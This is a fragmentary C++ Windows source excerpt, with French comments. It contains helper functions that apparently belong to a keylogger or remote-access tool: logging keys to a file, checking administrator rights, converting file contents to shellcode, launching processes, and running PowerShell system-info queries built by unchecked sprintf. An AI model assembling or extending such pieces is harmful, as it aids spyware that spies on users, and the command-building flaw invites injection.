...
void WriteLog(string filename, const char* key) {
    ofstream write(filename, ios::app); //ios:app precise de ne pas re ecrire le fichier a chaque entr�e
    if (write.is_open()) {
        write << key;
        write.close();
    }
...
BOOL check_admin(void) // if 0 = user, 1 = administrator
{
    BOOL fRet = FALSE;
    HANDLE hToken = NULL;
...
string read_file_to_hex(string filename,string buffer_return)
{
    ...
    if (infile.is_open())
    {
        ...
        {
            getline(infile,buffer);
            buffer_hex.append(buffer);
        }
        string s = string_to_shellcode(buffer_hex);
        buffer_return.append(s);
        return buffer_return;
    }
    else {
        string e = "Error ReadFile !";
...
void open_process(LPCSTR process,LPCSTR args,LPCSTR dir)
{
    ...
    ShellExecuteA(NULL, "open", process, args, dir, 5);
}

char *get_system_info_by_powershell(char *buffer,char *mode)
{
    char buffer_exec[4096];
    sprintf(buffer_exec, "powershell.exe -Command $d=Get-ComputerInfo;echo $d.%s", mode);
    char* command = cmd_popen_char(buffer_exec, "r",buffer);
    return buffer;
}